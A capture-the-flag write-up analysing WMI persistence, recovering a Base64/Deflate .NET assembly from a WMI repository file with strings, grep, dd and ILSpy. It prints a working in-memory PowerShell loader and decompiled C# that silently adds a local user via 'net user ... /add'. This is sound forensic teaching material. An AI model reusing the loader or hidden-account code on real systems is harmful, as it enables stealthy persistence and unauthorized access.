# After Hours – Writeup

## Overview

This challenge demonstrates a persistence technique that avoids traditional Windows autorun locations by abusing **Windows Management Instrumentation (WMI)**. Instead of storing a payload on disk or configuring a scheduled task, the attacker stores a Base64-encoded, Deflate-compressed .NET assembly inside a custom WMI class. A PowerShell loader retrieves this data, decompresses it, loads it directly into memory, and executes its entry point.

The objective is to recover the embedded payload and extract the hidden flag.

---

# Enumeration

After extracting the provided challenge files, the directory structure revealed an `OBJECTS.DATA` file inside the `challenge_attachments` directory.

```
challenge_attachments/
└── OBJECTS.DATA
```

A separate `tools/` directory also contained instructions for installing **ILSpy**, suggesting that reverse engineering a .NET assembly would eventually be required.

Since `OBJECTS.DATA` stores the WMI repository, it became the primary artefact for analysis.

---

# Searching for Suspicious Strings

The first step was to search the repository for indicators of PowerShell execution, Base64 payloads, or command execution.

```bash
strings OBJECTS.DATA | grep -Ei "powershell|base64|FromBase64|cmd.exe|http|Invoke|payload"
```

This produced a long PowerShell command containing a Base64-encoded `-enc` argument.

After decoding the PowerShell, the following loader was recovered:

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream(
    [IO.MemoryStream][Convert]::FromBase64String($file),
    [IO.Compression.CompressionMode]::Decompress
);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){
    $o.Write($b,0,$r);
    $r = $d.Read($b,0,1024);
}
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke(
    $null,@(,[string[]]@())
)|Out-Null
```

From this loader we can immediately identify the attack chain:

* Retrieve the `ConfigData` property from the custom WMI class `Win32_HardwareTelemetry`
* Base64 decode the property value
* Deflate decompress the result
* Load the resulting .NET assembly directly into memory
* Execute its entry point

---

# Locating the Embedded Payload

Searching the repository confirmed multiple references to the malicious WMI class.

```bash
grep -aob "Win32_HardwareTelemetry" OBJECTS.DATA
```

```
578858
2659626
9286954
22467882
```

Searching for the property name produced matching offsets.

```bash
grep -aob "ConfigData" OBJECTS.DATA
```

```
578883
2659651
9286979
22467907
```

To inspect the surrounding data, the following loop was used:

```bash
for off in 578883 2659651 9286979 22467907; do
    echo "========== CONFIGDATA @ $off =========="
    dd if=OBJECTS.DATA bs=1 skip=$((off-200)) count=2500 2>/dev/null | strings
done
```

This revealed the contents of the `ConfigData` property, which consisted of a long Base64 string beginning with:

```
7VZPbFRFGP/...
```

---

# Extracting the Payload

The Base64 string was extracted automatically from the repository.

```bash
strings OBJECTS.DATA \
| grep -E '^[A-Za-z0-9+/]{500,}={0,2}$' \
| sort -u > payloads.txt
```

The payload was then decoded.

```bash
base64 -d payloads.txt > payload.bin
```

Since the PowerShell loader used a raw Deflate stream, Python was used to decompress it.

```bash
python3 -c "import zlib; d=open('payload.bin','rb').read(); open('payload.dll','wb').write(zlib.decompress(d,-zlib.MAX_WBITS))"
```

Running `file` confirmed that the recovered payload was a .NET executable.

```bash
file payload.dll
```

Output:

```
payload.dll: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

---

# Static Analysis

A quick search for interesting strings revealed the assembly name.

```bash
strings payload.dll | grep -Ei 'flag|THM|Hacker|After|Holiday'
```

Output:

```
AfterHours
```

The provided ILSpy tool was then used to inspect the assembly.

```bash
chmod +x ILSpy
./ILSpy ../../../challenge_attachments/payload.dll
```

The assembly contained a namespace named `AfterHours` with a `Program` class.

Its `Main()` method contained the following code:

```csharp
if (string.Equals(Environment.MachineName,
    "bytelotusdc",
    StringComparison.OrdinalIgnoreCase))
{
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    processStartInfo.Arguments =
        "/c net user patch <BASE-64-ENCODED FLAG> /add";

    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.CreateNoWindow = true;

    Process.Start(processStartInfo);
}
else
{
    Console.WriteLine("Execution halted: Environment mismatch.");
}
```

The malware first verifies that it is executing on a machine named **`bytelotusdc`**, acting as a simple sandbox/environment check.

If the hostname matches, it silently executes:

```
net user patch <Base64> /add
```

Instead of storing the flag directly, the password supplied to `net user` is Base64-encoded.

---

# Recovering the Flag

The embedded string was:

```
<BASE-64-ENCODED FLAG>
```

Decoding it is straightforward:

```bash
echo "<BASE-64-ENCODED FLAG>" | base64 -d
```

This reveals the challenge flag.

---

# Conclusion

This challenge showcases an effective WMI persistence technique that bypasses many traditional persistence checks.

The attacker:

1. Created a custom WMI class (`Win32_HardwareTelemetry`).
2. Stored a Base64-encoded, Deflate-compressed .NET assembly inside the `ConfigData` property.
3. Used a PowerShell loader to retrieve and decompress the payload.
4. Loaded the assembly directly into memory using reflection.
5. Performed a hostname check before executing its payload.
6. Embedded the challenge flag as a Base64-encoded string within the command arguments.

The key lesson from this room is that persistence mechanisms extend well beyond Startup folders and registry Run keys. When common autorun locations appear clean, examining the WMI repository—particularly `OBJECTS.DATA`—can reveal malicious classes, event consumers, or embedded payloads that standard persistence tools may overlook.
